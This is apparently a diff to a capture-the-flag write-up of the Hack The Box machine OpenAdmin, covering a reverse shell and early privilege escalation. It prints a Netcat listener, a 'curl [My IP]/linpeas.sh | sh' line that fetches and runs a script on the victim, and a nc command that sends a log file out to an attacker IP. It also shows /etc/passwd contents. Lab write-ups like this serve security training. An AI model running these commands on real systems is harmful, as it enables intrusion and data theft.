@@ -237,7 +237,7 @@ I successfully executed remote commands by firing them individually (you can als
 
 But this was extremely slow, so I decided to curl the exploit myself and throw a [reverse payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) in it to gain an interactive shell.  
 
-Had a couple issues getting it to work, but I just copied the original, deleted the "echo" cmd, url-encoded a bash payload to add instead and ran Netcat :  
+Had a couple issues getting it to work, but I just copied the original, deleted the "echo" cmd, [url-encoded](https://www.urlencoder.org/) a bash payload to add instead and ran Netcat :  
 
 ```bash
 nc -nvlp 4242
@@ -254,4 +254,50 @@ Now checking back on our Netcat listener, we have a shell :
 >www-data@openadmin  
 
 ## Privilege Escalation  
+
+So, the first issue we have is we need to spawn a tty shell, because upon logging in we see the message :  
+
+>bash: no job control in this shell  
+
+We can do that easily using python3 :  
+
+```bash
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/qwerty.py
+python3 /tmp/qwerty.py
+```  
+
+### Enumerating Internals  
+
+I started grabbing important files and in /etc/passwd we see there are a couple interesting users available :  
+
+```
+root:x:0:0:root:/root:/bin/bash
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+```  
+
+I tried logging in as them with the **su** command, but we need passwords.  
+
+I went ahead and hosted a local copy of [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases), downloaded & ran it on our victim :  
+
+```bash
+HOST:
+sudo mv ./linpeas.sh /var/www/html
+sudo service apache2 start
+
+VICTIM:
+# This command downloads linpeas from my web server, runs it, and outputs to a file /tmp/linpeas.log
+curl [My IP]/linpeas.sh | sh > /tmp/linpeas.log
+```  
+
+I opted to grab the results file with Netcat, just to have a local copy :  
+
+```bash
+My Machine:
+nc -l -p 8899 > linpeas.log
+
+OpenAdmin Box:
+nc -w 3 10.10.14.42 8899 < /tmp/linpeas.log
+```
 
